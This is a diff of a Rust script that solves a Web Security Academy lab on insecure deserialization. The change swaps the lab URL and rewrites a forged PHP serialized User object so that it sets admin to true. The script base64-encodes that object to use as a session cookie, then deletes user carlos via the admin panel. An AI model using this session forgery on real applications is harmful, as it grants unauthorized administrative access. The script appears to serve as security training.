@@ -4,7 +4,7 @@
 *
 * Hack Steps:
 *      1. Encode the serialized object after modifying
-*      2. Delete carlos from the admin panel with the modified 
+*      2. Delete carlos from the admin panel with the modified
 *         object as session
 *
 ****************************************************************/
@@ -20,13 +20,13 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a80003b04d61eee8542970400ee0022.web-security-academy.net";
+const LAB_URL: &str = "https://0a80000103a689d483e1f68a0035006e.web-security-academy.net";
 
 fn main() {
     print!("⦗1⦘ Encoding the serialized object after modifying.. ");
     flush_terminal();
 
-    let serialized = r###"O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}"###;
+    let serialized = r###"O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}"###;
     let serialized_encoded = STANDARD.encode(serialized);
 
     println!("{}", "OK".green());
